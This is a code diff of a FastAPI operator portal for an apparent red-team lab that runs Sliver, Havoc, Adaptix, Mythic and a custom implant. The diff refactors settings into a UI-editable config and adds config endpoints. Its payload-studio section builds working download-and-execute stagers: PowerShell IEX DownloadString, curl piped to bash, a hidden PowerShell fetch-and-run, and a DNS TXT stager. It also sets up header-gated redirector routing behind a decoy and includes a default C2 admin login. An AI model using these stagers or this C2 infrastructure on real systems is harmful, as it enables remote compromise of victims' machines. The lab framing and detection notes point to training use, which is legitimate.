@@ -19,7 +19,7 @@ from typing import Any
 
 from fastapi import FastAPI, HTTPException, Request
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse, HTMLResponse, JSONResponse
+from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, Response
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel, Field
 
@@ -45,34 +45,91 @@ STATIC_DIR = Path(__file__).resolve().parent / "static"
 if STATIC_DIR.exists():
     app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")
 
-# Environment & Default Configuration
+# Lab settings resolve through labconfig (UI override > env > default); see
+# labconfig.py. Reading them through accessors - not module constants - is
+# what makes the values changeable from the UI without restarting anything.
+import labconfig  # noqa: E402
+
 REDIRECTOR_HOST = os.environ.get("REDIRECTOR_HOST", "127.0.0.1")
-REDIRECTOR_PORT = int(os.environ.get("REDIRECTOR_HTTP_PORT", "80"))
-C2_HEADER_NAME = os.environ.get("C2_HEADER_NAME", "X-Request-ID")
-C2_HEADER_VALUE = os.environ.get("C2_HEADER_VALUE", "cadre-c2")
-MERIDIAN_DNS_DOMAIN = os.environ.get("MERIDIAN_DNS_DOMAIN", "c2.lab.local")
-# Victim-facing IP of the redirector host (what implants phone home to).
-# Env-driven: a lab on other addressing would silently generate wrong
-# stagers otherwise. Set VICTIM_REDIRECTOR_IP to your redirector host.
-VICTIM_REDIRECTOR_IP = os.environ.get("VICTIM_REDIRECTOR_IP", "192.168.100.1")
+
+
+def _cfg(key: str) -> str:
+    return labconfig.get(key)
+
+
+def _cfg_int(key: str, fallback: int) -> int:
+    return labconfig.get_int(key, fallback)
+
+
+def _prefix(framework: str) -> str:
+    return _cfg(f"{framework}_uri_prefix")
+
+
+def _victim_ip() -> str:
+    """Victim-facing address implants call back to."""
+    return _cfg("victim_redirector_ip")
+
+
+def _header_pair() -> tuple[str, str]:
+    return _cfg("c2_header_name"), _cfg("c2_header_value")
+
+
+def _prefixes() -> dict[str, str]:
+    return {fw: _cfg(f"{fw}_uri_prefix") for fw in
+            ("meridian", "sliver", "havoc", "adaptix", "mythic")}
+
+
+def _ports() -> dict[str, dict[str, Any]]:
+    http = f"via redirector :{_cfg_int('redirector_http_port', 80)}"
+    return {
+        "redirector": {"http": _cfg_int("redirector_http_port", 80),
+                       "internal": 80, "type": "Edge Proxy / Decoy"},
+        "meridian": {"dns": MERIDIAN_DNS_PORT, "http": http,
+                     "type": "HTTP / DNS TXT C2"},
+        "sliver": {"control": _cfg_int("sliver_ctrl_port", 31337),
+                   "http": http, "type": "Go C2 / In-Memory .NET"},
+        "havoc": {"teamserver": _cfg_int("havoc_ts_port", 40056),
+                  "http": http, "type": "C++ Demon / EDR Evasion"},
+        "adaptix": {"teamserver": _cfg_int("adaptix_ts_port", 4321),
+                    "http": http, "type": "Go Multiplayer C2"},
+        "mythic": {"ui": _cfg_int("mythic_ui_port", 7443), "http": http,
+                   "type": "Extensible Web C2"},
+    }
+
+
+def _victim_base() -> str:
+    """http://<victim-ip>:<redirector-port> - the base every stager builds on."""
+    return f"http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}"
+
+
+# Legacy aliases kept for the existing call sites below; they are resolved
+# per access through the module __getattr__ hook at the bottom of this block
+# so a settings change is visible immediately everywhere.
 MERIDIAN_DNS_PORT = int(os.environ.get("MERIDIAN_DNS_PORT", "15353"))
 
-FRAMEWORK_PREFIXES = {
-    "meridian": os.environ.get("MERIDIAN_URI_PREFIX", "/gateway/v1/telemetry"),
-    "sliver": os.environ.get("SLIVER_URI_PREFIX", "/cloud/storage/objects"),
-    "havoc": os.environ.get("HAVOC_URI_PREFIX", "/edge/cache/assets"),
-    "adaptix": os.environ.get("ADAPTIX_URI_PREFIX", "/api/v1/sync"),
-    "mythic": os.environ.get("MYTHIC_URI_PREFIX", "/cdn/media/stream"),
-}
 
-FRAMEWORK_PORTS = {
-    "redirector": {"http": REDIRECTOR_PORT, "internal": 80, "type": "Edge Proxy / Decoy"},
-    "meridian": {"dns": int(os.environ.get("MERIDIAN_DNS_PORT", "15353")), "http": "via redirector :80", "type": "HTTP / DNS TXT C2"},
-    "sliver": {"control": int(os.environ.get("SLIVER_CTRL_PORT", "31337")), "http": "via redirector :80", "type": "Go C2 / In-Memory .NET"},
-    "havoc": {"teamserver": int(os.environ.get("HAVOC_TS_PORT", "40056")), "http": "via redirector :80", "type": "C++ Demon / EDR Evasion"},
-    "adaptix": {"teamserver": int(os.environ.get("ADAPTIX_TS_PORT", "4321")), "http": "via redirector :80", "type": "Go Multiplayer C2"},
-    "mythic": {"ui": int(os.environ.get("MYTHIC_UI_PORT", "7443")), "http": "via redirector :80", "type": "Extensible Web C2"},
-}
+def __getattr__(name: str) -> Any:
+    """Resolve the historic module-level settings names dynamically.
+
+    External importers (tests, tools) that still do `app.VICTIM_REDIRECTOR_IP`
+    keep working, and always see the current configured value rather than
+    whatever the environment said at import.
+    """
+    if name == "VICTIM_REDIRECTOR_IP":
+        return _victim_ip()
+    if name == "REDIRECTOR_PORT":
+        return _cfg_int("redirector_http_port", 80)
+    if name == "C2_HEADER_NAME":
+        return _cfg("c2_header_name")
+    if name == "C2_HEADER_VALUE":
+        return _cfg("c2_header_value")
+    if name == "MERIDIAN_DNS_DOMAIN":
+        return _cfg("meridian_dns_domain")
+    if name == "FRAMEWORK_PREFIXES":
+        return _prefixes()
+    if name == "_ports()":
+        return _ports()
+    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")
 
 
 # ============================================================================
@@ -267,12 +324,15 @@ class VictimCommandRequest(BaseModel):
 
 class AdaptixListenerRequest(BaseModel):
     name: str = Field("cadre_http", description="Listener instance name")
-    callback_address: str = Field(f"{VICTIM_REDIRECTOR_IP}:80",
-                                  description="Where the AGENT dials (the redirector)")
-    uri: str = Field("/api/v1/sync", description="Must match ADAPTIX_URI_PREFIX")
-    port: int = Field(80, description="In-container bind port")
-    c2_header: str = Field("X-Request-ID")
-    c2_header_value: str = Field("cadre-c2")
+    # Optional fields fall back to the live lab settings at call time, so a
+    # UI change is picked up without the client having to resend them.
+    callback_address: str | None = Field(
+        None, description="Where the AGENT dials (the redirector). "
+                          "Default: <victim IP>:<redirector port>")
+    uri: str | None = Field(None, description="Must match ADAPTIX_URI_PREFIX")
+    port: int | None = Field(None, description="In-container bind port")
+    c2_header: str | None = Field(None, description="Redirector gate header name")
+    c2_header_value: str | None = Field(None, description="Gate header value")
 
 
 class AdaptixAgentRequest(BaseModel):
@@ -359,8 +419,9 @@ class SliverGenerateRequest(BaseModel):
     kind: str = Field("session", description="beacon | session (sessions are "
                                              "taskable immediately; beacons need "
                                              "`interactive` first)")
-    c2_url: str = Field(f"{VICTIM_REDIRECTOR_IP}:80/cloud/storage/objects",
-                        description="Implant callback URL (redirector prefix)")
+    c2_url: str | None = Field(
+        None, description="Implant callback URL. Default: "
+                          "<victim IP>:<redirector port><sliver prefix>")
     target_os: str = Field("windows", description="windows | linux")
     arch: str = Field("amd64", description="amd64 | 386")
 
@@ -415,12 +476,12 @@ def _mythic_http_c2() -> dict[str, Any]:
     decoy. callback_host carries no port (OPSEC rejects it).
     """
     return {
-        "callback_host": f"http://{VICTIM_REDIRECTOR_IP}",
-        "callback_port": REDIRECTOR_PORT,
+        "callback_host": f"http://{_victim_ip()}",
+        "callback_port": _cfg_int('redirector_http_port', 80),
         "callback_interval": 10,
         "callback_jitter": 23,
-        "headers": {C2_HEADER_NAME: C2_HEADER_VALUE},
-        "post_uri": f"{FRAMEWORK_PREFIXES['mythic']}/data",
+        "headers": {_cfg('c2_header_name'): _cfg('c2_header_value')},
+        "post_uri": f"{_prefixes()['mythic']}/data",
         "AESPSK": "aes256_hmac",
         "encrypted_exchange_check": True,
         "killdate": "2027-09-07",
@@ -585,8 +646,12 @@ def ops_sliver_generate(req: SliverGenerateRequest) -> dict[str, Any]:
     `docker cp` retrieval command instead of a giant base64 body.
     """
     import sliver_client as sc
+    # Fall back to the live lab settings so the UI only has to send overrides.
+    c2_url = req.c2_url or (f"{_victim_ip()}:"
+                            f"{_cfg_int('redirector_http_port', 80)}"
+                            f"{_prefix('sliver')}")
     try:
-        return {"ok": True, **sc.generate(req.kind, req.c2_url,
+        return {"ok": True, **sc.generate(req.kind, c2_url,
                                           req.target_os, req.arch)}
     except cb.BackendError as exc:
         raise HTTPException(status_code=502, detail=str(exc)) from exc
@@ -684,7 +749,7 @@ def get_status() -> dict[str, Any]:
             container_map[clean_name] = {"id": cid, "state": state, "status": status}
 
     services_status = {}
-    for svc, meta in FRAMEWORK_PORTS.items():
+    for svc, meta in _ports().items():
         # Match against the docker container map. Compose service names appear as
         # "<project>-<service>-<n>", so prefer the exact "<prefix>-<svc>" segment
         # over a bare substring test: "mythic" also occurs inside
@@ -711,7 +776,7 @@ def get_status() -> dict[str, Any]:
         )
         if port_key == "dns":
             # UDP-only published port: probe it as DNS, not as TCP
-            is_port_live = probe_dns_txt_port(PROBE_HOST, meta["dns"], MERIDIAN_DNS_DOMAIN)
+            is_port_live = probe_dns_txt_port(PROBE_HOST, meta["dns"], _cfg('meridian_dns_domain'))
         elif port_key is not None:
             is_port_live = probe_tcp_port(PROBE_HOST, meta[port_key])
 
@@ -731,15 +796,15 @@ def get_status() -> dict[str, Any]:
             "ports": meta,
             "container": matched_container,
             "port_live": is_port_live,
-            "uri_prefix": FRAMEWORK_PREFIXES.get(svc),
+            "uri_prefix": _prefixes().get(svc),
         }
 
     return {
         "timestamp": datetime.now(timezone.utc).isoformat(),
         "docker_available": bool(docker_containers),
-        "redirector_http_port": REDIRECTOR_PORT,
-        "victim_redirector_ip": VICTIM_REDIRECTOR_IP,
-        "c2_header": f"{C2_HEADER_NAME}: {C2_HEADER_VALUE}",
+        "redirector_http_port": _cfg_int('redirector_http_port', 80),
+        "victim_redirector_ip": _victim_ip(),
+        "c2_header": f"{_cfg('c2_header_name')}: {_cfg('c2_header_value')}",
         "services": services_status,
     }
 
@@ -748,7 +813,7 @@ def get_status() -> dict[str, Any]:
 def container_action(service_name: str, action: str) -> dict[str, Any]:
     """Execute lifecycle action (start/stop/restart) on a C2Stack container."""
     clean_target = service_name.lower()
-    if clean_target not in FRAMEWORK_PORTS:
+    if clean_target not in _ports():
         # Allow-list: the endpoint controls Docker, so an unrecognised name must
         # not fall through to a substring match that could hit another container.
         raise HTTPException(status_code=404, detail=f"unknown service '{service_name}'")
@@ -807,7 +872,7 @@ def test_redirector_flow(req: RedirectorTestRequest) -> dict[str, Any]:
     """
     has_valid_header = False
     for k, v in req.headers.items():
-        if k.lower() == C2_HEADER_NAME.lower() and v.strip() == C2_HEADER_VALUE:
+        if k.lower() == _cfg('c2_header_name').lower() and v.strip() == _cfg('c2_header_value'):
             has_valid_header = True
             break
 
@@ -823,7 +888,7 @@ def test_redirector_flow(req: RedirectorTestRequest) -> dict[str, Any]:
 
     matched_framework = None
     clean_path = req.url_path.strip()
-    for fw, prefix in FRAMEWORK_PREFIXES.items():
+    for fw, prefix in _prefixes().items():
         if clean_path.startswith(prefix):
             matched_framework = fw
             break
@@ -832,9 +897,9 @@ def test_redirector_flow(req: RedirectorTestRequest) -> dict[str, Any]:
         # Diverted to CloudEdge CDN Decoy Page
         trace.append({
             "step": 2,
-            "title": f"Inspect Header: {C2_HEADER_NAME}",
+            "title": f"Inspect Header: {_cfg('c2_header_name')}",
             "node": "Apache RewriteEngine",
-            "detail": f"Header '{C2_HEADER_NAME}: {C2_HEADER_VALUE}' MISSING or INVALID. Access Denied to C2 Core.",
+            "detail": f"Header '{_cfg('c2_header_name')}: {_cfg('c2_header_value')}' MISSING or INVALID. Access Denied to C2 Core.",
             "status": "shield_divert",
         })
         trace.append({
@@ -856,14 +921,14 @@ def test_redirector_flow(req: RedirectorTestRequest) -> dict[str, Any]:
         # Header valid -> Route to backend
         trace.append({
             "step": 2,
-            "title": f"Inspect Header: {C2_HEADER_NAME}",
+            "title": f"Inspect Header: {_cfg('c2_header_name')}",
             "node": "Apache RewriteEngine",
-            "detail": f"Header verified ('{C2_HEADER_NAME}: {C2_HEADER_VALUE}'). Access granted to internal C2 network.",
+            "detail": f"Header verified ('{_cfg('c2_header_name')}: {_cfg('c2_header_value')}'). Access granted to internal C2 network.",
             "status": "header_verified",
         })
 
         if matched_framework:
-            backend_port = FRAMEWORK_PORTS[matched_framework].get("http", 80)
+            backend_port = _ports()[matched_framework].get("http", 80)
             trace.append({
                 "step": 3,
                 "title": f"Reverse Proxy to {matched_framework.capitalize()}",
@@ -955,16 +1020,20 @@ def get_payload_studio() -> dict[str, Any]:
             "description": "Ultra-lightweight, zero-dependency Go implant with dual HTTP & DNS TXT tunneling.",
             "stagers": {
                 "powershell_http": (
-                    f'$wc=New-Object Net.WebClient; $wc.Headers.Add("{C2_HEADER_NAME}","{C2_HEADER_VALUE}"); '
-                    f'IEX($wc.DownloadString("http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]}"))'
+                    f'$wc=New-Object Net.WebClient; $wc.Headers.Add("{_cfg('c2_header_name')}","{_cfg('c2_header_value')}"); '
+                    f'IEX($wc.DownloadString("http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["meridian"]}"))'
                 ),
                 "powershell_dns": (
-                    f'$cmd = (Resolve-DnsName -Name "init.c2.lab.local" -Type TXT -Server "{VICTIM_REDIRECTOR_IP}").Strings; '
-                    'IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($cmd)))'
+                    '$cmd = (Resolve-DnsName -Name "init.' +
+                    _cfg("meridian_dns_domain") +
+                    '" -Type TXT -Server "' + _victim_ip() +
+                    '").Strings; '
+                    'IEX([System.Text.Encoding]::UTF8.GetString('
+                    '[System.Convert]::FromBase64String($cmd)))'
                 ),
                 "bash_curl": (
-                    f'curl -s -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" '
-                    f'http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["meridian"]} | bash'
+                    f'curl -s -H "{_cfg('c2_header_name')}: {_cfg('c2_header_value')}" '
+                    f'http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["meridian"]} | bash'
                 ),
                 "binary_compile": "GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" -o parallax-windows-amd64.exe ./implant",
             },
@@ -978,8 +1047,8 @@ def get_payload_studio() -> dict[str, Any]:
             "name": "BishopFox Sliver",
             "description": "Enterprise-grade Go implant framework supporting in-memory .NET execution, BOFs, and lateral movement.",
             "stagers": {
-                "generate_session": f"sliver > generate --http {VICTIM_REDIRECTOR_IP}:80 --os windows --arch amd64 --save ./implant.exe",
-                "powershell_c2": f'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["sliver"]}\', \'$env:TEMP\\svc.exe\'); Start-Process \'$env:TEMP\\svc.exe\'"',
+                "generate_session": f"sliver > generate --http {_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()['sliver']} --os windows --arch amd64 --save ./implant.exe",
+                "powershell_c2": f'powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadFile(\'http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["sliver"]}\', \'$env:TEMP\\svc.exe\'); Start-Process \'$env:TEMP\\svc.exe\'"',
                 "execute_assembly": "sliver (session) > execute-assembly /opt/tools/Rubeus.exe triage",
             },
             "detection": {
@@ -993,7 +1062,7 @@ def get_payload_studio() -> dict[str, Any]:
             "description": "Modern C++ Demon payload featuring indirect syscalls, API hashing, and Ekko/Zilean sleep masking.",
             "stagers": {
                 "demon_build": "Havoc Client -> Attack -> Payload -> Format: Windows EXE/DLL -> Indirect Syscalls: Enabled -> Sleep Technique: Ekko",
-                "delivery": f'curl -H "{C2_HEADER_NAME}: {C2_HEADER_VALUE}" http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["havoc"]} -o payload.exe',
+                "delivery": f'curl -H "{_cfg('c2_header_name')}: {_cfg('c2_header_value')}" http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["havoc"]} -o payload.exe',
             },
             "detection": {
                 "network": "HTTP/HTTPS heartbeats with custom user-agents and jitter.",
@@ -1005,8 +1074,8 @@ def get_payload_studio() -> dict[str, Any]:
             "name": "Adaptix C2",
             "description": "Go-based post-exploitation teamserver for multiplayer operations with Gopher TCP agent.",
             "stagers": {
-                "client_connect": f"Adaptix Qt GUI Client -> Endpoint: {VICTIM_REDIRECTOR_IP}:4321 -> User: operator (or headless REST: POST /endpoint/login, see Module 4)",
-                "stager_cmd": f'powershell -c "Invoke-WebRequest -Uri http://{VICTIM_REDIRECTOR_IP}:{REDIRECTOR_PORT}{FRAMEWORK_PREFIXES["adaptix"]} -OutFile agent.exe"',
+                "client_connect": f"Adaptix Qt GUI Client -> Endpoint: {_victim_ip()}:{_cfg_int('adaptix_ts_port', 4321)} -> User: operator (or headless REST: POST /endpoint/login, see Module 4)",
+                "stager_cmd": f'powershell -c "Invoke-WebRequest -Uri http://{_victim_ip()}:{_cfg_int('redirector_http_port', 80)}{_prefixes()["adaptix"]} -OutFile agent.exe"',
             },
             "detection": {
                 "network": "Raw TCP/mTLS egress or HTTP sync calls on port 80.",
@@ -1018,9 +1087,9 @@ def get_payload_studio() -> dict[str, Any]:
             "name": "Mythic C2",
             "description": "Multi-agent collaborative framework (Apollo for Windows, Poseidon for Linux/macOS). Latest stable = 3.4.0.61 (v4 ships profiles built-in, not yet GA).",
             "stagers": {
-                "rest_login": f"curl -s http://{VICTIM_REDIRECTOR_IP}:7443/auth -X POST -H 'Content-Type: application/json' -d '{{\"username\":\"mythic_admin\",\"password\":\"mythic\"}}'",
-                "payload_build": f"create_c2parameter_instance_webhook -> start_stop_profile_webhook -> createpayload_webhook (payloadDefinition JSON-STRING, build_parameters as LIST; C2 shape: bare callback_host http://{VICTIM_REDIRECTOR_IP} + full-path post_uri /cdn/media/stream/data) -> download exe via GET /direct/download/<uuid>. Verified working incl. keying + COFF; see Docker/mythic/README.md and Module 5.",
-                "ui_url": f"http://{VICTIM_REDIRECTOR_IP}:7443 (REST/psql surface; the browser UI is upstream optional containers we don't ship)",
+                "rest_login": f"curl -s http://{_victim_ip()}:{_cfg_int('mythic_ui_port', 7443)}/auth -X POST -H 'Content-Type: application/json' -d '{{\"username\":\"mythic_admin\",\"password\":\"mythic\"}}'",
+                "payload_build": f"create_c2parameter_instance_webhook -> start_stop_profile_webhook -> createpayload_webhook (payloadDefinition JSON-STRING, build_parameters as LIST; C2 shape: bare callback_host http://{_victim_ip()} + full-path post_uri {_prefixes()['mythic']}/data) -> download exe via GET /direct/download/<uuid>. Verified working incl. keying + COFF; see Docker/mythic/README.md and Module 5.",
+                "ui_url": f"http://{_victim_ip()}:{_cfg_int('mythic_ui_port', 7443)} (REST/psql surface; the browser UI is upstream optional containers we don't ship)",
             },
             "detection": {
                 "network": "Customizable HTTP profile mimicking common CDN streaming services.",
@@ -1100,18 +1169,98 @@ def ops_summary() -> dict[str, Any]:
         "note": ("Havoc 0.7 exposes NO REST/gRPC API - the operator protocol is "
                  "WebSocket+TLS on 40056. The portal drives it via a raw "
                  "WebSocket client (see /api/ops/havoc/*)."),
-        "teamserver": f"havoc:{os.environ.get('HAVOC_TS_PORT', '40056')} "
+        "teamserver": f"havoc:{_cfg_int('havoc_ts_port', 40056)} "
                         "(operator WebSocket; victim-facing callback goes "
                         "through the redirector, not here)",
         "user": "5pider",
     }
     out["redirector"] = {
         "decoy": cb.probe_redirector("/", timeout=5.0),
-        "meridian": cb.probe_redirector("/gateway/v1/telemetry/",
-                                        {"X-Request-ID": os.environ.get(
-                                            "C2_HEADER_VALUE", "cadre-c2")}, timeout=5.0),
+        "meridian": cb.probe_redirector(
+            f"{_prefix('meridian')}/",
+            {_cfg("c2_header_name"): _cfg("c2_header_value")}, timeout=5.0),
     }
     return out
+
+
+class LabConfigUpdate(BaseModel):
+    """Partial update: only the keys present are changed. An empty string
+    clears an override and falls back to env/default."""
+    values: dict[str, Any] = Field(
+        ..., description="Setting key -> new value (see GET /api/config)")
+    clear: list[str] = Field(
+        default_factory=list, description="Setting keys to reset to env/default")
+
+
+@app.get("/api/config")
+def get_lab_config() -> dict[str, Any]:
+    """Every operator-configurable setting, its current value and provenance.
+
+    This is the endpoint the config UI renders from; it is also the honest
+    answer to "what is this lab actually using right now" - resolved values,
+    not the defaults someone remembers from the docs.
+    """
+    return {
+        "ok": True,
+        "settings": labconfig.snapshot(),
+        "config_path": labconfig.CONFIG_PATH,
+        "env_lines": labconfig.env_lines(),
+        "notes": {
+            "portal_scope": "Applied immediately. Drives stagers, build "
+                            "defaults and everything the portal hands to a "
+                            "teamserver API.",
+            "stack_scope": "Read by OTHER containers when they boot (Apache "
+                           "routes, Havoc's rendered profile, Meridian's "
+                           "listener config). Change it here, then copy the "
+                           "env file below into Docker/.env and recreate the "
+                           "containers.",
+        },
+    }
+
+
+@app.post("/api/config")
+def update_lab_config(req: LabConfigUpdate) -> dict[str, Any]:
+    """Persist lab settings from the UI.
+
+    Rejects unknown keys and malformed values instead of storing them: a
+    typo'd setting that silently does nothing is the worst outcome here,
+    because the operator would believe they had re-pointed their implants.
+    """
+    for key in req.clear:
+        if key not in labconfig.SETTINGS:
+            raise HTTPException(status_code=400,
+                                detail=f"unknown setting '{key}'")
+        labconfig.clear(key)
+    applied, errors = labconfig.set_overrides(req.values or {})
+    if errors:
+        raise HTTPException(status_code=400, detail="; ".join(errors))
+    return {
+        "ok": True,
+        "applied": applied,
+        "cleared": req.clear,
+        "settings": labconfig.snapshot(),
+        "env_file": labconfig.render_env_file(),
+        "restart_required": sorted(
+            k for k, spec in labconfig.SETTINGS.items()
+            if spec["scope"] == "stack"
+            and (k in applied or k in req.clear)),
+    }
+
+
+@app.get("/api/config/env-file")
+def download_lab_env() -> Response:
+    """The Docker/.env lines for stack-scope settings, ready to copy.
+
+    Portal-scope values are intentionally excluded: the portal persists them
+    itself, so writing them here too would create two sources of truth that
+    could disagree.
+    """
+    return Response(
+        content=labconfig.render_env_file(),
+        media_type="text/plain",
+        headers={"Content-Disposition":
+                 "attachment; filename=c2stack-lab.env"},
+    )
 
 
 @app.post("/api/ops/task")
@@ -1359,8 +1508,15 @@ def ops_adaptix_listener(req: AdaptixListenerRequest) -> dict[str, Any]:
     try:
         ac = ax.AdaptixClient()
         ac.login()
-        cfg = ax.http_listener_config(req.callback_address, req.uri,
-                                      req.c2_header, req.c2_header_value, req.port)
+        # Unset fields follow the lab settings: a listener created from the UI
+        # always matches the redirector route it has to get past.
+        cfg = ax.http_listener_config(
+            req.callback_address or f"{_victim_ip()}:"
+                                    f"{_cfg_int('redirector_http_port', 80)}",
+            req.uri or _prefix("adaptix"),
+            req.c2_header or _cfg("c2_header_name"),
+            req.c2_header_value or _cfg("c2_header_value"),
+            req.port or _cfg_int("redirector_http_port", 80))
         out = ac.create_listener(req.name, cfg)
         return {"ok": True, "listener": req.name, "response": out,
                 "listeners": ac.list_listeners()}
